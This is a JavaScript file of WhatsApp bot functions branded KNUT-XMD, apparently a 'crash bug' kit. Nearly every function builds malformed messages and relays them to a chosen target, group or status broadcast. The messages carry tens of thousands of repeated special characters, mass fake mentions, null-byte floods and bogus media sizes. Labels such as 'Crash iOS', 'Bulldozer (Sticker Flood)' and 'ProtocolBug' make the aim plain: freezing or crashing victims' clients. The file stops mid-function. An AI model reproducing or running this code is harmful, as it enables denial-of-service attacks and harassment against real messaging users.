
async function test(message, sock) {
  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
      image: { url: "https://files.catbox.moe/kyaw5k.jpg" }, // Replace with local or hosted image
      caption: "wrong",
      footer: "KNUT-XMD",
      media: true,
      interactiveButtons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text:` KNUT ${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text:`KNUT ${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text:` knut 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        }

      ]
    },
    {
      quoted: message
    }
  );
}


async function bug2(message, client, target) {

  const remoteJid = target;

  const groupMetadata= await client.groupMetadata(target);

  const participants = groupMetadata.participants.map(user => user.id);

  await client.sendMessage(

    remoteJid,
    {
      image: { url: "https://files.catbox.moe/kyaw5k.jpg" }, // Replace with local or hosted image

      caption: "KNUT XMD",

      footer: "🖤",

      media: true,

      interactiveButtons: [

        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `🖤 ${"ꦾ".repeat(29000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text:` Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text:` Te amo ${"ꦾ".repeat(29000)}\n\n`,
            url: "https://example.com"
          })
        },

      ]
    },
    {
      quoted: message,
       mentions: participants
    },

    

  );
}


async function bug3(message, client, target) {

  const remoteJid = target;

  const virus = "ꦾ".repeat(2000);

  const lastBug = await client.sendMessage(

    remoteJid,

    {
        text: "DEVIL-KNUT",

        footer: "🔞",

        cards: [

           {
              image: { url: '4.png' }, // or buffer,

              title: 'KNUT',

              caption: 'Devil-Knut',

              footer: "🖤",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: 'https://files.catbox.moe/kyaw5k.jpg' }, // or buffer,

              title: 'KNUT XMD',

              caption: 'vawulence',

footer: "🔞",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: 'https://files.catbox.moe/kyaw5k.jpg' }, // or buffer,

              title: 'woooo',

              caption: 'woooo',

              footer: "🖤",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           }

        ]
    },

    { quoted : message }
)   

  return lastBug;


}

async function xUi(sock, target) {
const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
remoteJid: "X",
stanzaId: "123",
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid:
Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
body: {
text:
" #4izxvelzExerct1st. " +
"ꦽ".repeat(50000) +
"ꦾ".repeat(50000),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: {"title":`${"𑲭𑲭".repeat(10000)}`, 
"sections":[{"title":" i wanna be kill you ","rows":[]}]},
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\0",
flow_message_version: "3",
}),
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"𑲭𑲭".repeat(10000)}`,
url: "https://Wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://Wa.me/stickerpack/4izxvelzexect",
}),
},
{
name: "cta_app_link",
buttonParamsJson: JSON.stringify({
display_text:` 4izxvelzExerc1st. ${"ꦽ".repeat(10000)}`,
android_app_metadata: {
url: "https://Wa.me/stickerpack/4izxvelzexect",
consented_users_url: "https://t.me/rizxvelzexct",
},
}),
},
{
name: "galaxy_message",
buttonParamsJson:
"{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2

subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
},
],
messageParamsJson: "{}",
},
},
},
},
};

await sock.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}
// === DelayInvisNew ===
async function DelayInvisNew(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "\u2060",
      matchedText: "\u2060",
      canonicalUrl: "https://t.me/DevRaizel",
      title: "𝐊𝐍𝐔𝐓",
      description: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇‌⃟🖤✦",
      jpegThumbnail: "https://files.catbox.moe/aanan8.jpg",
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 1,
          previewType: "DOCUMENT",
          title: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇‌⃟🖤✦",
          thumbnailUrl: "https://files.catbox.moe/aanan8.jpg",
          sourceUrl: "https://t.me/DevKnut"
        }
      }
    }
  };

  // On génère un vrai message WhatsApp
  const msg = generateWAMessageFromContent(target, { extendedTextMessage: payload.extendedTextMessage }, {});

  // Puis on l’envoie
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// === SuperDelayInvid corrigé ===
async function superdelayinvid(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇‌⃟🖤✦",
      contextInfo: {
        participant: "13135550002@s.whatsapp.net",
        quotedMessage: {
          extendedTextMessage: {
            text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇‌⃟🖤✦",
          },
        },
        remoteJid: "status@broadcast"
      }
    }
  };

  // Génération du message complet
  const msg = generateWAMessageFromContent(
    target,
    { extendedTextMessage: payload.extendedTextMessage },
    {}
  );

  // Envoi au contact ciblé
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}
// === DelayCrash corrigé ===
async function delayCrash(sock, target, mention = false, delayMs = 500) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mimetype: "image/jpeg",
          caption: "💥 KNUT-CRASH",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  // Générer le vrai message
  const msg = generateWAMessageFromContent(target, generateMessage, {});

  // Envoi direct sur la cible
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

  // Si mention activée
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }
    );
  }

  // Délai entre les envois
  await new Promise(res => setTimeout(res, delayMs));
}

async function Loc(sock, target, amount = 500, jids = false) {
  try {
    // Création du message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "🌍 KNUT LOC",
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "KNUT Location",
                },
                hasMediaAttachment: true,
              },
              body: {
                text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍‌⃟⏤‌‌‌‌‌🖤✦",
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 10 }, (_, i) => ({
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "⚡ " + "⩺".repeat(amount),
                    sections: [
                      {
                        title:` Section ${i + 1}`,
                        rows: [{ title: "Click", id: "row_" + i }],
                      },
                    ],
                  }),
                })),
              },
              carouselMessage: {
                cards: [],
              },
            },
          },
        },
      },
      {}
    );

    // Envoi du message
    await sock.relayMessage(
      target,
      msg.message,
      jids ? { participant: { jid: target }, messageId: msg.key.id } : { messageId: msg.key.id }
    );

    console.log("✅ Loc envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans Loc:", err);
  }
}

// === thunderblast_ios1 (Crash iOS) ==
async function thunderblast_ios1(sock, target) {
  const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);

  // Générateur
  const genMsg = (fileName, bodyText) =>
    generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc",
                  mimetype: "application/json",
                  fileName,
                  fileLength: "999999999999",
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileEncSha256:
                    "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                },
                hasMediaAttachment: true,
              },
              body: { text: bodyText },
              nativeFlowMessage: {
                messageParamsJson: {"name":"galaxy_message","flow_action":"navigate","flow_cta":"🚀","flow_id":"UNDEFINEDONTOP"},
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" },
                ],
              },
            },
          },
        },
      }),
      {}
    );

  // Premier message
  const msg1 = genMsg(`${TravaIphone}️, "𑇂𑆵𑆴𑆿".repeat(1000)`);
  await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

  // Deuxième message
  const msg2 = genMsg(
    "UNDEFINEDONTOP",
    "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000)
  );
  await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

  // Location message
  const locMsg = generateWAMessageFromContent(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: TravaIphone,
        url: "https://youtube.com/@ShinZ.00",
      },
    },
    {}
  );
  await sock.relayMessage(target, locMsg.message, { messageId: locMsg.key.id });

// ExtendedText message
  const extMsg = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: TravaIphone,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "UNDEFINEDONTOP↕️" + "ꦾ".repeat(50000),
          },
        },
      },
    },
    {}
  );
  await sock.relayMessage(target, extMsg.message, { messageId: extMsg.key.id });
}

// === callHome ===
async function callHome(sock, target, ptcp = true) {
  try {
    const conf = ptcp ? { participant: { jid: target } } : {};

    // Génération correcte du message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: false },
              body: {
                text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐋𝐋‌⃟⏤‌‌‌‌‌🩸✦",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({ status: "📞" }),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "",
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    // Envoi avec clé
    await sock.relayMessage(target, msg.message, {
      ...conf,
      messageId: msg.key.id,
    });

    console.log("✅ callHome envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur callHome:", err);
  }
}
// === Bulldozer (Sticker Flood) ===
async function bulldozer(sock, target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 40000 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    };

    // Générer correctement le message
    const msg = generateWAMessageFromContent(target, message, {});

    // Envoyer vers la cible (et pas uniquement status@broadcast)
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log("✅ Bulldozer envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur Bulldozer:", err);
  }
}

// === Protocol Bug 1 ===
async function protocolbug1(sock, target, mention = false) {
  try {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
      title: "⩀".repeat(9741),
      rows: [{ title: `${r + 1}, id: ${r + 1}` }],
    }));

    const MSG = {
      viewOnceMessage: {

message: {
          listResponseMessage: {
            title: "🌈 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝐁𝐮𝐠",
            listType: 2,
            buttonText: null,
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🌐" },
            contextInfo: {
              mentionedJid: Array.from({ length: 9741 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target, // ✅ ici on envoie bien sur la cible
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "9741@newsletter",
                serverMessageId: 1,
                newsletterName: "x!s - rizxvelz",
              },
            },
            description: "( # )",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    // ✅ envoyer au target (pas juste status@broadcast)
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // ✅ tu peux garder l'envoi vers status@broadcast en plus si tu veux que ça touche aussi les status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Envoi d'un "mention protocol" si activé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "🌐 Protocol Mention Flood" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug1 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug1:", err);
  }
}
// === Protocol Bug 2 (Image Flood) ===
async function protocolbug2(sock, target, mention = false) {
  try {
    const generateMessage = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "⚡ ProtocolBug2 ⚡",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            contextInfo: {
              mentionedJid: Array.from({ length: 30000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target, // ✅ correction : envoi direct au target
              forwardingScore: 9741,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) aussi sur status@broadcast si tu veux l'effet status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug2 Mention ⚡" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug2:", err);
  }
}
// === Protocol Bug 3 (Video Flood + Mentions) ===
async function protocolbug3(sock, target, shibal = false) {
  try {
    const Rizxvelz = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: "⚡ ProtocolBug3 ⚡",
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  ),
                ],
                remoteJid: target, // ✅ Correction : la cible réelle
              },
            },
          },
        },
      },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, Rizxvelz.message, { messageId: Rizxvelz.key.id });

    // (Optionnel) aussi sur status@broadcast si tu veux garider l’effet
    await sock.relayMessage("status@broadcast", Rizxvelz.message, {
      messageId: Rizxvelz.key.id,
      statusJidList: [target],
    });

    // Envoi mention si activé
    if (shibal) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: Rizxvelz.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug3 Mention ⚡" }, content: undefined },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug3 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug3:", err);
  }
}
// === Protocol Bug 8 (Video + Embedded Music) ===
async function protocolbug8(sock, target, mention = false) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 40000 }, () => 1${Math.floor(Math.random() * 500000)}@s.whatsapp.net)
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: ".Rizxvelz Official" + "⚡".repeat(5000),
      title: "Zoro",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
      artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
      isExplicit: true
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",

fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "⚡ ProtocolBug8 ⚡",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      contextInfo: { 
        mentionedJid: mentionedList,
        remoteJid: target  // ✅ Correction : cible réelle
      },
      annotations: [{ embeddedContent: { embeddedMusic } }]
    };

    // Génération du message
    const msg = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { videoMessage } } },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) flood aussi via broadcast
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Mentions spéciales si activé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
        },
        {
          additionalNodes: [
            { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug8 Mention ⚡" }, content: undefined }
          ]
        }
      );
    }

    console.log("✅ ProtocolBug8 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug8:", err);
  }
}
// === Protocol Bug 6 (Interactive Flood) ===
async function protocolbug6(sock, target, mention = false) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "⚡ ProtocolBug6 ⚡", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "flex_agency",
                paramsJson: "\u0000".repeat(500000), // ⚡ flood massif
                version: 3,
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "x!s - rizxvelz",
                  newsletterJid: "120363319314627296@newsletter",
                  serverMessageId: 1,
                },
              },
            },
          },
        },
      },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) Envoi en broadcast pour effet status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Mentions si demandé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug6 Mention ⚡" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug6 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug6:", err);
  }
}
// === Protocol Bug 7 (Audio Flood) ===
async function protocolbug7(sock, target, mention = false) {
  try {
    const mentionedJids = Array.from({ length: 40000 }, () =>
      ${Math.floor(Math.random() * 500000)}@s.whatsapp.net
    );

    const audioMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      mimetype: "audio/mpeg",
      fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
      fileLength: 9999999999,
      seconds: 999999,

ptt: true,
      mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
      fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      contextInfo: {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "⚡ Rizxvelz Flood ⚡"
        }
      }
    };

    const msg = generateWAMessageFromContent(
      target,
      { ephemeralMessage: { message: { audioMessage } } },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // ✅ Envoi broadcast (pour status flood en parallèle)
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });

    // ✅ Mention si demandé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug7 Mention ⚡" },
              content: undefined
            }
          ]
        }
      );
    }

    console.log("✅ ProtocolBug7 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug7:", err);
  }
}
// === Carousels2 ===
async function carousels2(sock, target, fJids = false) {
  try {
    // ✅ Image à utiliser
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/c11niu.jpeg" } }, // ton image ici
      { upload: sock.waUploadToServer }
    );

    const header = proto.Message.InteractiveMessage.Header.fromObject({
      imageMessage: media.imageMessage,
      title: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋‌⃟⏤‌‌‌‌‌🖤✦",
      gifPlayback: false,
      subtitle: "⚡ Carrousel Crash ⚡",
      hasMediaAttachment: true,
    });

    // ✅ Générer 1000 cartes
    const cards = Array.from({ length: 1000 }, () => ({
      header,
      body: {
        text: "⏤⃟‌𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋‌⃟⏤‌‌‌‌‌🖤✦",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "🔗 Voir",
              url: "https://example.com",
            }),
          },
        ],
      },
    }));

    // ✅ Créer le message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "⚡ Carrousel spécial RAIZEL ⚡" },
              footer: { text: "𓆩⏤⃟‌𝐑𝐀𝐈𝐙𝐄𝐋𓆪" },
              carouselMessage: { cards, messageVersion: 1 },
            },
          },
        },
      },
      {}
    );

    // ✅ Envoyer au target
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(fJids ? { participant: { jid: target } } : {}),
    });

    console.log("✅ Carousels2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans carousels2:", err);
  }
}
// === CarouselX ===
async function CarouselX(sock, target) {
  try {
    let push = [];

